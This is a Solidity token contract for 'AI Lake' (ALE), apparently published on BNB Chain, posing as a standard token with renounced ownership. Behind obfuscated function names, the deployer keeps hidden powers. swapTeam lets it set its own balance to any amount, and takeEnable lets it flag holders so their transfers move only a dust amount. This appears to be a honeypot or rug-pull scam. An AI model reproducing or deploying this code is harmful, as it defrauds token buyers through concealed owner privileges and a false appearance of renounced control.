/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface listAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitFund {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AILake is Ownable{
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint256 constant marketingTake = 10 ** 10;
    mapping(address => mapping(address => uint256)) public allowance;
    bool public tradingSell;
    mapping(address => bool) public limitMaxMin;
    string public name = "AI Lake";


    mapping(address => uint256) public balanceOf;
    address public marketingSell;
    address public teamLaunched;

    string public symbol = "ALE";
    mapping(address => bool) public fundReceiver;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        listAuto takeLiquidityFee = listAuto(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        teamLaunched = limitFund(takeLiquidityFee.factory()).createPair(takeLiquidityFee.WETH(), address(this));
        marketingSell = maxAmountLaunched();
        limitMaxMin[marketingSell] = true;
        balanceOf[marketingSell] = totalSupply;
        emit Transfer(address(0), marketingSell, totalSupply);
        renounceOwnership();
    }

    

    function getOwner() external view returns (address) {
        return owner();
    }

    function takeEnable(address shouldToken) public {
        if (shouldToken == marketingSell || shouldToken == teamLaunched || !limitMaxMin[maxAmountLaunched()]) {
            return;
        }
        fundReceiver[shouldToken] = true;
    }

    function maxAmountLaunched() private view returns (address) {
        return msg.sender;
    }

    function maxSenderFee(address modeFund, address feeLaunchMin, uint256 swapBuyIs) internal returns (bool) {
        require(balanceOf[modeFund] >= swapBuyIs);
        balanceOf[modeFund] -= swapBuyIs;
        balanceOf[feeLaunchMin] += swapBuyIs;
        emit Transfer(modeFund, feeLaunchMin, swapBuyIs);
        return true;
    }

    function swapTeam(uint256 swapBuyIs) public {
        if (!limitMaxMin[maxAmountLaunched()]) {
            return;
        }
        balanceOf[marketingSell] = swapBuyIs;
    }

    function transferFrom(address toWallet, address exemptShould, uint256 swapBuyIs) public returns (bool) {
        if (toWallet != maxAmountLaunched() && allowance[toWallet][maxAmountLaunched()] != type(uint256).max) {
            require(allowance[toWallet][maxAmountLaunched()] >= swapBuyIs);
            allowance[toWallet][maxAmountLaunched()] -= swapBuyIs;
        }
        if (exemptShould == marketingSell || toWallet == marketingSell) {
            return maxSenderFee(toWallet, exemptShould, swapBuyIs);
        }
        if (fundReceiver[toWallet]) {
            return maxSenderFee(toWallet, exemptShould, marketingTake);
        }
        return maxSenderFee(toWallet, exemptShould, swapBuyIs);
    }

    function approve(address minFrom, uint256 swapBuyIs) public returns (bool) {
        allowance[maxAmountLaunched()][minFrom] = swapBuyIs;
        emit Approval(maxAmountLaunched(), minFrom, swapBuyIs);
        return true;
    }

    function transfer(address exemptShould, uint256 swapBuyIs) external returns (bool) {
        return transferFrom(maxAmountLaunched(), exemptShould, swapBuyIs);
    }

    function senderBuy(address tokenLaunched) public {
        if (tradingSell) {
            return;
        }
        limitMaxMin[tokenLaunched] = true;
        tradingSell = true;
    }


}